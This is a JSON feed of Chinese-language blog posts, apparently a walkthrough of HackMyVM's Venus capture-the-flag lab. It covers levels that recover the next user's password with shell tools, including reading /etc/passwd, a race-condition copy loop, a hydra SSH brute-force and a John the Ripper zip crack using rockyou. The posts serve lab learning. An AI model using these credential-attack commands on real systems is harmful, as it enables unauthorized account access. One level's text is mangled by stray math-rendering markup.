data-num=\"7\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> adela adela  <span class=\"token number\">807</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .profile</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root  adela   <span class=\"token number\">31</span> Apr  <span class=\"token number\">7</span> 05:55 flagz.txt</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root  adela  <span class=\"token number\">213</span> Apr  <span class=\"token number\">7</span> 05:55 mission.txt</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root  adela   <span class=\"token number\">44</span> Apr  <span class=\"token number\">7</span> 06:00 wtf</pre></td></tr></table></figure><p>这里的文件 &quot;wtf&quot; 引人注目。它是什么类型的文件？</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">file</span> wtf</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>wtf: ASCII text</pre></td></tr></table></figure><p>所以一个文本文件。如果我们显示内容，我们应该会看到某种模式：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> wtf</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>.--. .- .--. .- .--. .- .-. .- -<span class=\"token punctuation\">..</span> <span class=\"token punctuation\">..</span> <span class=\"token punctuation\">..</span>. <span class=\"token builtin class-name\">.</span></pre></td></tr></table></figure><p>摩尔斯电码，可以在 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tb3JzZWNvZGUud29ybGQvaW50ZXJuYXRpb25hbC90cmFuc2xhdG9yLmh0bWw=\">https://morsecode.world/international/translator.html</span> 在线方便地进行，从而获得下一个级别的密码。</p>\n",
            "tags": [
                "Linux",
                "CTF",
                "打靶",
                "hackMyVM"
            ]
        },
        {
            "id": "http://zhyzhyzhy.cn/2022/11/08/hackmyvm-venus-walkthrough-3-5/",
            "url": "http://zhyzhyzhy.cn/2022/11/08/hackmyvm-venus-walkthrough-3-5/",
            "title": "HackMyVM Venus Walkthrough 3/5",
            "date_published": "2022-11-07T18:00:00.000Z",
            "content_html": "<h1 id=\"hackmyvm-venus-walkthrough-35\"><a class=\"anchor\" href=\"#hackmyvm-venus-walkthrough-35\">#</a> HackMyVM Venus Walkthrough 3/5</h1>\n<h2 id=\"0x21\"><a class=\"anchor\" href=\"#0x21\">#</a> 0x21</h2>\n<blockquote>\n<p>Mission: User eloise has saved her password in a particular way.</p>\n</blockquote>\n<p>这里，下一级的密码在文件 eloise 中。如果你做过一些 CTF 并查看文件的内容，你会很快看到数据是 Base64 编码的。那么让我们看看这个数据是什么：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> eloise <span class=\"token operator\">|</span> base64 <span class=\"token parameter variable\">-d</span></pre></td></tr></table></figure><p>查看文件头，它看起来非常像 PDF 文件。由于我们无法在远程系统上轻松查看文件的内容，我们只需将文件 'eloise' 的 Base64 编码内容复制到剪贴板，在本地创建一个新文件 'eloise' 并将复制的数据粘贴到那里.</p>\n<p>然后我们重复我们已经在远程系统上执行的过程，但将输出重定向到 &quot;eloise.pdf&quot; 文件：</p>\n<pre><code>cat eloise | base64 -d &gt; eloise.pdf\n</code></pre>\n<p>PDF 包含下一级的密码</p>\n<h2 id=\"0x22\"><a class=\"anchor\" href=\"#0x22\">#</a> 0x22</h2>\n<blockquote>\n<p>Mission: User lucia has been creative in saving her password.</p>\n</blockquote>\n<p>Lucia 创造性地将她的密码存储在文件 hi. 让我们看看文件中的内容：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> hi</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>00000000: <span class=\"token number\">7576</span> 4d77 <span class=\"token number\">4644</span> <span class=\"token number\">5172</span> <span class=\"token number\">5157</span> 504d <span class=\"token number\">6547</span> 500a</pre></td></tr></table></figure><p>这看起来很像十六进制转储。幸运的是，我们可以使用 Linux 命令行工具将十六进制转储转换回：</p>\n<p>cat hi | xxd -r<br />\n 下一级别的密码就在您的屏幕上.</p>\n<h2 id=\"0x23\"><a class=\"anchor\" href=\"#0x23\">#</a> 0x23</h2>\n<blockquote>\n<p>Mission: The user isabel has left her password in a file in the /etc/xdg folder but she does not remember the name, however she has dict.txt that can help her to remember.</p>\n</blockquote>\n<p>要获取 isabel 的密码，我们需要在目录 '/etc/xdg' 中找到一个文件，但我们不知道它的名称。但是我们知道文件名在文件 'dict.txt' 中。在这里，bash 脚本再次可以帮助我们：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token environment constant\">IFS</span> <span class=\"token operator\">=</span> <span class=\"token builtin class-name\">read</span> <span class=\"token parameter variable\">-r</span> line<span class=\"token punctuation\">;</span> <span class=\"token keyword\">do</span> <span class=\"token function\">cat</span> /etc/xdg/<span class=\"token variable\">$line</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">done</span> <span class=\"token operator\">&lt;</span> dict.txt <span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span>/dev/null</pre></td></tr></table></figure><p>我们逐行读取文件 'dict.txt' 并尝试输出对应的文件 cat. 我们将错误消息重定向到 &quot;/dev/null&quot;. 这样我们就得到了下一级的密码.</p>\n<h2 id=\"0x24\"><a class=\"anchor\" href=\"#0x24\">#</a> 0x24</h2>\n<blockquote>\n<p>Mission: The password of the user freya is the only string that is not repeated in different.txt</p>\n</blockquote>\n<p>为了获取密码，我们需要查看 &quot;different.txt&quot; 文件并找到唯一不重复的行。幸运的是，有一个命令行工具 <code>uniq</code>  正是为此目的而调用的：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">uniq</span> <span class=\"token parameter variable\">-u</span> different.txt</pre></td></tr></table></figure><p>使用 -u 选项，我们指定输出不重复的行.</p>\n<h2 id=\"0x25\"><a class=\"anchor\" href=\"#0x25\">#</a> 0x25</h2>\n<blockquote>\n<p>Mission: User alexa puts her password in a .txt file in /free every minute and then deletes it.</p>\n</blockquote>\n<p>每分钟都会在包含密码的文件夹 &quot;/free&quot; 中创建一个文本文件，并在不久之后将其删除.</p>\n<p>也就是条件竞争漏洞.</p>\n<p>使用一个小的 bash 脚本，这个级别很快就解决了.</p>\n<p>首先我们在 &quot;/tmp&quot; 文件夹中创建一个目录，因为我们在那里有写权限：</p>\n<pre><code>mkdir /tmp/free\n</code></pre>\n<p>查看目录 &quot;/free&quot;, 并将目录中的所有文件复制到 &quot;/tmp/free&quot;. 之后，我们就有了时间来查看我们的脚本发现了什么：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token assign-left variable\">end</span><span class=\"token operator\">=</span><span class=\"token variable\"><span class=\"token variable\">$((</span>SECONDS<span class=\"token operator\">+</span><span class=\"token number\">60</span><span class=\"token variable\">))</span></span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">while</span> <span class=\"token punctuation\">[</span> <span class=\"token environment constant\">$SECONDS</span> <span class=\"token parameter variable\">-lt</span> <span class=\"token variable\">$end</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">do</span> <span class=\"token function\">cp</span> <span class=\"token parameter variable\">-RT</span> /free /tmp/free<span class=\"token punctuation\">;</span> <span class=\"token keyword\">done</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">ls</span> /tmp/free</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>beer.txt</pre></td></tr></table></figure><p>所以下一级的密码在文件 '/tmp/free/beer.txt' 中.</p>\n<h2 id=\"0x26\"><a class=\"anchor\" href=\"#0x26\">#</a> 0x26</h2>\n<blockquote>\n<p>Mission: The password of the user ariel is online! (HTTP)</p>\n</blockquote>\n<p>这个级别又很简单。我们只需要向 <span class=\"exturl\" data-url=\"aHR0cDovL2xvY2FsaG9zdA==\">http://localhost</span> 发送一个请求 curl：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">curl</span> http://localhost</pre></td></tr></table></figure><h2 id=\"0x27\"><a class=\"anchor\" href=\"#0x27\">#</a> 0x27</h2>\n<blockquote>\n<p>Mission: Seems that ariel dont save the password for lola, but there is a temporal file.</p>\n</blockquote>\n<p>首先，查看主目录中有哪些文件：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ls</span> <span class=\"token parameter variable\">-la</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>drwxr-x--- <span class=\"token number\">2</span> root  ariel  <span class=\"token number\">4096</span> Apr  <span class=\"token number\">7</span> 05:56.</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>drwxr-xr-x <span class=\"token number\">1</span> root  root   <span class=\"token number\">4096</span> Apr  <span class=\"token number\">7</span> 05:55<span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> ariel ariel   <span class=\"token number\">220</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span>.bash_logout</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> ariel ariel  <span class=\"token number\">3526</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span>.bashrc</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root  ariel <span class=\"token number\">12288</span> Apr  <span class=\"token number\">7</span> 05:56.goas.swp</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> ariel ariel   <span class=\"token number\">807</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span>.profile</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root  ariel    <span class=\"token number\">31</span> Apr  <span class=\"token number\">7</span> 05:55 flagz.txt</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root  ariel   <span class=\"token number\">254</span> Apr  <span class=\"token number\">7</span> 05:55 mission.txt</pre></td></tr></table></figure><p>任务文本提到了一个临时文件。这可能是 &quot;.goas.swp&quot; 文件.<br />\n'.swp' 文件由文本编辑器 VIM 创建作为备份.</p>\n<p>要恢复文件，我们创建一个临时目录 'tmp/vim' 并启动 VIM：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">mkdir</span> /tmp/vim</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">vim</span> goas</pre></td></tr></table></figure><p>VIM 询问我们要如何打开文件。我们决定使用 (R) ecover 选项。接下来我们被问到应该恢复哪个文件。我们选择列表中的最后一个文件 (7).</p>\n<p>我们的密码文件已恢复。我们现在使用命令将文件保存 <code>:w /tmp/vim/goas</code>  在我们之前创建的临时目录中，并使用 VIM 命令退出  <code>:q!</code></p>\n<p>现在我们将新创建的文件的内容复制到剪贴板中，并在我们的计算机上本地创建一个新文件 &quot;lola.txt&quot;, 我们将剪贴板的内容粘贴到该文件中.</p>\n<p>现在我们可以方便 hydra 地尝试使用哪个密码对用户 &quot;lola&quot; 有效：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>hydra <span class=\"token parameter variable\">-l</span> lola <span class=\"token parameter variable\">-P</span> lola.txt ssh://venus.hackmyvm.eu:5000</pre></td></tr></table></figure><h2 id=\"0x28\"><a class=\"anchor\" href=\"#0x28\">#</a> 0x28</h2>\n<blockquote>\n<p>Mission: The user celeste has left a list of names of possible .html pages where to find her password.</p>\n</blockquote>\n<p>这里我们必须 curl 再次向 <span class=\"exturl\" data-url=\"aHR0cDovL2xvY2FsaG9zdA==\">http://localhost</span> 发送请求，但这次我们必须将请求发送到特定的 HTML 页面.</p>\n<p>由于手动浏览文件 'pages.txt' 的每一行需要很长时间，我们再次编写一个小的 bash 脚本：</p>\n<p>while IFS= read -r line; do curl &quot;<span class=\"exturl\" data-url=\"aHR0cDovL2xvY2FsaG9zdC8kbGluZS5odG1s\">http://localhost/$line.html</span>&quot; -sf; done &lt; pages.txt<br />\n 不久之后，我们就有了下一级的密码.</p>\n<h2 id=\"0x29\"><a class=\"anchor\" href=\"#0x29\">#</a> 0x29</h2>\n<blockquote>\n<p>Mission: The user celeste has access to mysql but for what?</p>\n</blockquote>\n<p>Celeste 可以访问 MySQL 数据库。然后让我们看一下数据库.</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>mysql <span class=\"token parameter variable\">-u</span> celeste <span class=\"token parameter variable\">-p</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Enter password:</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>MariaDB <span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>none<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token operator\">></span> show databases<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>+--------------------+</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">|</span> Database           <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>+--------------------+</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">|</span> information_schema <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">|</span> venus              <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>+--------------------+</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>MariaDB <span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>none<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token operator\">></span> use venus<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>MariaDB <span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>none<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token operator\">></span> show tables<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>+-----------------+</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token operator\">|</span> Tables_in_venus <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>+-----------------+</pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token operator\">|</span> people          <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>+-----------------+</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>MariaDB <span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>none<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token operator\">></span> <span class=\"token keyword\">select</span> * from people<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>使用最后一个命令，我们得到了 &quot;people&quot; 表的内容.</p>\n<p>仔细看一下表格，因为那里不仅隐藏了下一级的密码，还隐藏了一个隐藏的标志.</p>\n<p>要知道要查找哪个用户密码，值得查看文件 &quot;/etc/passwd&quot;. 您会在当前级别的用户下找到下一个级别的用户。有了这些信息，很容易找到下一个密码.</p>\n<h2 id=\"0x30\"><a class=\"anchor\" href=\"#0x30\">#</a> 0x30</h2>\n<blockquote>\n<p>MIssion: The user kira is hidding something in <span class=\"exturl\" data-url=\"aHR0cDovL2xvY2FsaG9zdC9tZXRob2QucGhw\">http://localhost/method.php</span></p>\n</blockquote>\n<p>您可以通过使用特定 HTTP 方法向 <span class=\"exturl\" data-url=\"aHR0cDovL2xvY2FsaG9zdC9tZXRob2QucGhw\">http://localhost/method.php</span> 发送请求来获取用户 kira 的密码，从而获得下一个级别的密码.</p>\n<p>关于哪些方法可用的信息可以在 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZGUvZG9jcy9XZWIvSFRUUC9NZXRob2Rz\">https://developer.mozilla.org/de/docs/Web/HTTP/Methods</span>  找到</p>\n<p>这里有一个 tips：尝试所有方法，也许你会发现一个隐藏的标志😉</p>\n<p>只需替换 '???' 使用您要使用的方法.</p>\n<p>注意，HEAD 不适用于此。为此，您可以简单地使用 <code>curl -I http://localhost/method.php.</code></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">curl</span> <span class=\"token parameter variable\">-X</span> ??? http://localhost/method.php</pre></td></tr></table></figure>",
            "tags": [
                "Linux",
                "CTF",
                "打靶",
                "hackMyVM"
            ]
        },
        {
            "id": "http://zhyzhyzhy.cn/2022/11/08/hackmyvm-venus-walkthrough-2-5/",
            "url": "http://zhyzhyzhy.cn/2022/11/08/hackmyvm-venus-walkthrough-2-5/",
            "title": "HackMyVM Venus Walkthrough 2/5",
            "date_published": "2022-11-07T17:00:00.000Z",
            "content_html": "<h1 id=\"hackmyvm-venus-walkthrough-25\"><a class=\"anchor\" href=\"#hackmyvm-venus-walkthrough-25\">#</a> HackMyVM Venus Walkthrough 2/5</h1>\n<h2 id=\"0x11\"><a class=\"anchor\" href=\"#0x11\">#</a> 0x11</h2>\n<blockquote>\n<p>Mission: The password of the user lucy is in the line that ends with 0JuAZ (these last 5 characters are not part of her password)</p>\n</blockquote>\n<p>Lucy 的密码在文件 &quot;end&quot; 中，并在以 &quot;0JuAZ&quot; 结尾的行中。要获取密码，我们只需使用正则表达式 0JuAZ<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">‘</mi><mi>c</mi><mi>a</mi><mi>t</mi><mi mathvariant=\"normal\">‘</mi><mtext>打</mtext><msup><mtext>印</mtext><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mi>e</mi><mi>n</mi><msup><mi>d</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mtext>的内容并通过管道将它们传递给</mtext><mi mathvariant=\"normal\">‘</mi><mi>g</mi><mi>r</mi><mi>e</mi><mi>p</mi><mi mathvariant=\"normal\">‘</mi><mo separator=\"true\">,</mo></mrow><annotation encoding=\"application/x-tex\">, `cat` 打印 &#x27;end&#x27; 的内容并通过管道将它们传递给`grep` ,</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.946332em;vertical-align:-0.19444em;\"></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">‘</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">t</span><span class=\"mord\">‘</span><span class=\"mord cjk_fallback\">打</span><span class=\"mord\"><span class=\"mord cjk_fallback\">印</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">n</span><span class=\"mord\"><span class=\"mord mathnormal\">d</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">内</span><span class=\"mord cjk_fallback\">容</span><span class=\"mord cjk_fallback\">并</span><span class=\"mord cjk_fallback\">通</span><span class=\"mord cjk_fallback\">过</span><span class=\"mord cjk_fallback\">管</span><span class=\"mord cjk_fallback\">道</span><span class=\"mord cjk_fallback\">将</span><span class=\"mord cjk_fallback\">它</span><span class=\"mord cjk_fallback\">们</span><span class=\"mord cjk_fallback\">传</span><span class=\"mord cjk_fallback\">递</span><span class=\"mord cjk_fallback\">给</span><span class=\"mord\">‘</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">p</span><span class=\"mord\">‘</span><span class=\"mpunct\">,</span></span></span></span> 符号表示我们正在寻找以 $ 符号之前的字符结尾的字符串。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> end <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> 0JuAZ$</pre></td></tr></table></figure><p>现在您拥有下一个级别的凭据。但不要忘记字符串 '0JuAZ' 不是密码的一部分。</p>\n<h2 id=\"0x12\"><a class=\"anchor\" href=\"#0x12\">#</a> 0x12</h2>\n<blockquote>\n<p>Mission: The password of the user elena is between the characters fu and ck</p>\n</blockquote>\n<p>所以下一级的密码在 'fu' 和 'ck' 之间。非常有意思。同样， <code>grep</code>  与正则表达式一起帮助我们。然后让我们看看正则表达式可能是什么样子：</p>\n<p>我们正在寻找一个以 'fu' 开头的字符串。表达式为  <code>^fu</code> <br />\n 接下来是任意数量的任意字符。这个表达式是  <code>.*</code> <br />\n 字符串应以 'ck' 结尾，因此表达式为  <code>ck$</code> <br />\n 一切看起来像这样：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> file.yo <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> ^fu.*ck$</pre></td></tr></table></figure><p>现在您有了下一级的密码。请记住，开头的 &quot;fu&quot; 和结尾的 &quot;ck&quot; 不是密码的一部分。</p>\n<h2 id=\"0x013\"><a class=\"anchor\" href=\"#0x013\">#</a> 0x013</h2>\n<blockquote>\n<p>Mission: The user alice has her password is in an environment variable.</p>\n</blockquote>\n<p>要获得下一级的密码，我们只需要打印环境变量即可。PASS 变量包含密码。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">printenv</span> <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> PASS</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>或</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">export</span> <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> PASS</pre></td></tr></table></figure><h2 id=\"0x014\"><a class=\"anchor\" href=\"#0x014\">#</a> 0x014</h2>\n<blockquote>\n<p>Mission: The admin has left the password of the user anna as a comment in the file passwd.</p>\n</blockquote>\n<p>所以密码在文件 /etc/passwd 中。由于文件比较长，我们看一下当前用户所在的行😉</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> /etc/passwd <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> alice</pre></td></tr></table></figure><h2 id=\"0x15\"><a class=\"anchor\" href=\"#0x15\">#</a> 0x15</h2>\n<blockquote>\n<p>Mission: Maybe sudo can help you to be natalia.</p>\n</blockquote>\n<p><code>sudo</code>  可以帮助我们根据任务描述成为 natalia。然后让我们尝试使用 -u 选项并将 natalia 指定为用户。我们还想 <code>bash</code>  作为命令运行：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token parameter variable\">-u</span> natalia /bin/bash</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">whoami</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>natalia</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token builtin class-name\">cd</span> ~</pre></td></tr></table></figure><p>嗯，效果很好。</p>\n<h2 id=\"0x16\"><a class=\"anchor\" href=\"#0x16\">#</a> 0x16</h2>\n<blockquote>\n<p>Mission: The password of user eva is encoded in the base64.txt file.</p>\n</blockquote>\n<p>下一级的密码在文件 &quot;base64.txt&quot; 中并已编码。文件名表明密码是  <code>base64</code>  编码的，因此我们使用 <code>base64</code>  带有 -d 选项的命令对其进行解码。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> base64.txt <span class=\"token operator\">|</span> base64 <span class=\"token parameter variable\">-d</span></pre></td></tr></table></figure><h2 id=\"0x17\"><a class=\"anchor\" href=\"#0x17\">#</a> 0x17</h2>\n<blockquote>\n<p>Mission: The password of the clara user is found in a file modified on May 1, 1968.</p>\n</blockquote>\n<p>所以密码在 1968 年 5 月 1 日更改的文件中。</p>\n<p>在这里，我们可以使用带有 -newermt 选项的  <code>find </code> 命令。但是，由于 Linux 使用 Epoch Unix 时间戳，因为它们从 01/01/1970 开始，所以我们无法搜索在 1968 年更改的文件。相反，我们显示在 01/02/1970 之前更改的所有文件：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">find</span> / <span class=\"token parameter variable\">-type</span> f <span class=\"token operator\">!</span> <span class=\"token parameter variable\">-newermt</span> <span class=\"token number\">1970</span>-01-02 <span class=\"token parameter variable\">-ls</span> <span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span>/dev/null</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">403708</span>      <span class=\"token number\">4</span> -rw-r--r--   <span class=\"token number\">1</span> root     root           <span class=\"token number\">16</span> Jan  <span class=\"token number\">1</span>  <span class=\"token number\">1970</span> /usr/lib/cmdo</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">cat</span> /usr/lib/cmdo</pre></td></tr></table></figure><h2 id=\"0x18\"><a class=\"anchor\" href=\"#0x18\">#</a> 0x18</h2>\n<blockquote>\n<p>Mission: The password of user frida is in the password-protected zip (rockyou.txt can help you).</p>\n</blockquote>\n<p>这个级别有点复杂。首先，我们必须将受密码保护的 zip 存档下载到我们的 PC，然后使用 JohnTheRipper 破解它。JohnTheRipper 和密码文件 rockyou.txt 都包含在 Kali 中。</p>\n<p>作为第一步，我们使用命令行工具 <code>sftp</code>  (或 <code>scp</code> ) 将存档下载到我们的 PC。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sftp</span> <span class=\"token parameter variable\">-P</span> <span class=\"token number\">5000</span> clara@venus.hackmyvm.eu</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>get protected.zip </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Fetching /pwned/clara/protected.zip to protected.zip</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>/pwned/clara/protected.zip</pre></td></tr></table></figure><p>接下来，我们需要从 JohnTheRipper 可以使用的 zip 存档中创建一个哈希：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>zip2john protected.zip <span class=\"token operator\">></span> hash.txt</pre></td></tr></table></figure><p>现在我们有了哈希文件，我们可以使用 JohnTheRipper 和 rockyou.txt 词表来破解密码：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>john <span class=\"token parameter variable\">--format</span><span class=\"token operator\">=</span>PKZIP <span class=\"token parameter variable\">--wordlist</span><span class=\"token operator\">=</span>/usr/share/wordlists/rockyou.txt hash.txt</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Using default input encoding: UTF-8</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Loaded <span class=\"token number\">1</span> password <span class=\"token builtin class-name\">hash</span> <span class=\"token punctuation\">(</span>PKZIP <span class=\"token punctuation\">[</span><span class=\"token number\">32</span>/64<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Will run <span class=\"token number\">4</span> OpenMP threads</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Press <span class=\"token string\">'q'</span> or Ctrl-C to abort, almost any other key <span class=\"token keyword\">for</span> status</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>pass123          <span class=\"token punctuation\">(</span>protected.zip/pwned/clara/protected.txt<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>1g <span class=\"token number\">0</span>:00:00:00 DONE <span class=\"token punctuation\">(</span><span class=\"token 